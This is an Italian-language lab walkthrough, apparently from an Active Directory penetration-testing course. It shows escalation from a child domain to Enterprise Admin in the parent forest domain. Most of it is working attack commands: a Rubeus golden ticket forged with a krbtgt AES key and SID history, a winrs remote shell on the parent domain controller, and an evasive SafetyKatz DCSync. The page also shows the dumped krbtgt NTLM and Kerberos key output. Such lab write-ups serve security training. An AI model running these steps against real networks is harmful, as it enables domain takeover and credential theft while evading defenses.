# LEARNING OBJECTIVE19

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Using DA access to dollarcorp.moneycorp.local, escalate privileges to\
  Enterprise Admin or DA to the parent domain, moneycorp.local using\
  dollarcorp's krbtgt hash.

### SVOLGIMENTO

Abbiamo già l'hash krbtgt da dcorp-dc. Creiamo il TGT inter-realm e lo iniettiamo. Esegui il comando seguente:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
```

<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
winrs -r:mcorp-dc.moneycorp.local cmd
```

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Fantastico!

Possiamo anche eseguire gli attacchi DCSync contro moneycorp. Utilizzare il seguente comando nel prompt sopra indicato, dove abbiamo inserito il ticket:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

SAM Username : krbtgt Account Type : 30000000 ( USER\_OBJECT ) User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL\_ACCOUNT ) Account expiration : Password last change : 11/11/2022 9:46:24 PM Object Security ID : S-1-5-21-335606122-960912869-3279953914-502 Object Relative ID : 502

Credentials: Hash NTLM: a0981492d5dfab1ae0b97b51ea895ddf ntlm- 0: a0981492d5dfab1ae0b97b51ea895ddf lm - 0: 87836055143ad5a507de2aaeb9000361

Supplemental Credentials:

* Primary:NTLM-Strong-NTOWF \* Random Value : 7c7a5135513110d108390ee6c322423f
* Primary:Kerberos-Newer-Keys \* Default Salt : MONEYCORP.LOCALkrbtgt Default Iterations : 4096 Credentials aes256\_hmac (4096) : 90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e aes128\_hmac (4096) : 801bb69b81ef9283f280b97383288442 des\_cbc\_md5 (4096) : c20dc80d51f7abd9
